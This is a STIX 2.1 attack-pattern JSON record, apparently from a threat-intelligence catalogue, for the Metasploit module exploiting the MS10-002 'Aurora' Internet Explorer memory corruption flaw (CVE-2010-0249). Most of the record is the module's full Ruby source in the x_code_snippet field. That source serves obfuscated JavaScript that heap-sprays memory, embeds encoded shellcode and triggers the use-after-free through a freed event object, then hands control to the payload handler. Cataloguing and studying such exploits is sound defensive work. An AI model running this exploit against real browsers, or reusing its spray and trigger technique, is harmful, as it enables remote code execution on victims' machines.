{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e8f7f020-39d6-4ce4-89a6-312320966a5a",
    "created": "2024-08-14T16:40:08.093192Z",
    "modified": "2024-08-14T16:40:08.093197Z",
    "name": "MS10-002 Microsoft Internet Explorer \"Aurora\" Memory Corruption",
    "description": " This module exploits a memory corruption flaw in Internet Explorer. This flaw was found in the wild and was a key component of the \"Operation Aurora\" attacks that lead to the compromise of a number of high profile companies. The exploit code is a direct port of the public sample published to the Wepawet malware analysis site. The technique used by this module is currently identical to the public sample, as such, only Internet Explorer 6 can be reliably exploited.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms10_002_aurora.rb",
            "external_id": "ms10_002_aurora.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-0249"
        },
        {
            "source_name": "reference",
            "url": "https://web.archive.org/web/20100609073233/http://wepawet.iseclab.org/view.php?hash=1aea206aa64ebeabb07237f1e2230d0f&type=js"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #\n  # Superceded by ms10_018_ie_behaviors, disable for BrowserAutopwn\n  #\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #\t:ua_name    => HttpClients::IE,\n  #\t:ua_minver  => \"6.0\",\n  #\t:ua_maxver  => \"6.0\",\n  #\t:javascript => true,\n  #\t:os_name => OperatingSystems::Match::WINDOWS,\n  #\t:vuln_test  => nil, # no way to test without just trying it\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'MS10-002 Microsoft Internet Explorer \"Aurora\" Memory Corruption',\n      'Description'    => %q{\n          This module exploits a memory corruption flaw in Internet Explorer. This\n        flaw was found in the wild and was a key component of the \"Operation Aurora\"\n        attacks that lead to the compromise of a number of high profile companies. The\n        exploit code is a direct port of the public sample published to the Wepawet\n        malware analysis site. The technique used by this module is currently identical\n        to the public sample, as such, only Internet Explorer 6 can be reliably exploited.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'unknown',\n          'hdm'      # Metasploit port\n        ],\n      'References'     =>\n        [\n          ['MSB', 'MS10-002'],\n          ['CVE', '2010-0249'],\n          ['OSVDB', '61697'],\n          ['URL', 'https://web.archive.org/web/20100609073233/http://wepawet.iseclab.org/view.php?hash=1aea206aa64ebeabb07237f1e2230d0f&type=js']\n\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'    => 1000,\n          'BadChars' => \"\\x00\",\n          'Compat'   =>\n            {\n              'ConnectionType' => '-find',\n            },\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', { }],\n        ],\n      'DisclosureDate' => '2010-01-14', # wepawet sample\n      'DefaultTarget'  => 0))\n\n    @javascript_encode_key = rand_text_alpha(rand(10) + 10)\n  end\n\n  def on_request_uri(cli, request)\n\n    if (request.uri.match(/\\.gif/i))\n      data = \"R0lGODlhAQABAIAAAAAAAAAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==\".unpack(\"m*\")[0]\n      send_response(cli, data, { 'Content-Type' => 'image/gif' })\n      return\n    end\n\n    if (!request.uri.match(/\\?\\w+/))\n      send_local_redirect(cli, \"?#{@javascript_encode_key}\")\n      return\n    end\n\n    var_boom       = rand_text_alpha(rand(100) + 1)\n\n    var_element    = rand_text_alpha(rand(100) + 1)\n    var_event      = rand_text_alpha(rand(100) + 1)\n    var_loaded     = rand_text_alpha(rand(100) + 1)\n    var_loaded_arg = rand_text_alpha(rand(100) + 1)\n\n    var_memory     = rand_text_alpha(rand(100) + 1)\n    var_spray      = rand_text_alpha(rand(100) + 1)\n    var_i          = rand_text_alpha(rand(100) + 1)\n\n    var_el_array   = rand_text_alpha(rand(100) + 1)\n    bleh           = rand_text_alpha(3);\n    var_grab_mem   = rand_text_alpha(rand(100) + 1)\n\n    var_unescape   = rand_text_alpha(rand(100) + 1)\n    var_shellcode  = rand_text_alpha(rand(100) + 1)\n\n    var_span_id    = rand_text_alpha(rand(100) + 1)\n    var_start      = rand_text_alpha(rand(100) + 1)\n    rand_html      = rand_text_english(rand(400) + 500)\n\n    js = <<-EOS\nvar #{var_element} = \"COMMENT\";\nvar #{var_el_array} = new Array();\nfor (i = 0; i < 1300; i++)\n{\n#{var_el_array}[i] = document.createElement(#{var_element});\n#{var_el_array}[i].data = \"#{bleh}\";\n}\nvar #{var_event} = null;\nvar #{var_memory} = new Array();\nvar #{var_unescape} = unescape;\nfunction #{var_boom}()\n{\nvar #{var_shellcode} = #{var_unescape}( '#{Rex::Text.to_unescape(regenerate_payload(cli).encoded)}');\nvar #{var_spray} = #{var_unescape}( \"%\" + \"u\" + \"0\" + \"c\" + \"0\" + \"d\" + \"%u\" + \"0\" + \"c\" + \"0\" + \"d\" );\ndo { #{var_spray} += #{var_spray} } while( #{var_spray}.length < 0xd0000 );\nfor (#{var_i} = 0; #{var_i} < 150; #{var_i}++) #{var_memory}[#{var_i}] = #{var_spray} + #{var_shellcode};\n}\nfunction #{var_loaded}(#{var_loaded_arg})\n{\n#{var_boom}();\n#{var_event} = document.createEventObject(#{var_loaded_arg});\ndocument.getElementById(\"#{var_span_id}\").innerHTML = \"\";\nwindow.setInterval(#{var_grab_mem}, 50);\n}\nfunction #{var_grab_mem}()\n{\np = \"\\\\u0c0f\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\\\\u0c0d\";\nfor (i = 0; i < #{var_el_array}.length; i++)\n{\n#{var_el_array}[i].data = p;\n}\nvar t = #{var_event}.srcElement;\n}\nEOS\n    js_encoded = encrypt_js(js, @javascript_encode_key)\n\n    html = %Q|<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\">\n<html>\n<head>\n<script>\n#{js_encoded}\n</script>\n</head>\n<body>\n<span id=\"#{var_span_id}\"><iframe src=\"#{get_resource}#{var_start}.gif\" onload=\"#{var_loaded}(event)\" /></span></body></html>\n</body>\n</html>|\n\n    print_status(\"Sending #{self.name}\")\n    # Transmit the compressed response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html', 'Pragma' => 'no-cache' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-01-14, # wepawet sample",
    "x_mitre_platforms": [
        "win'"
    ]
}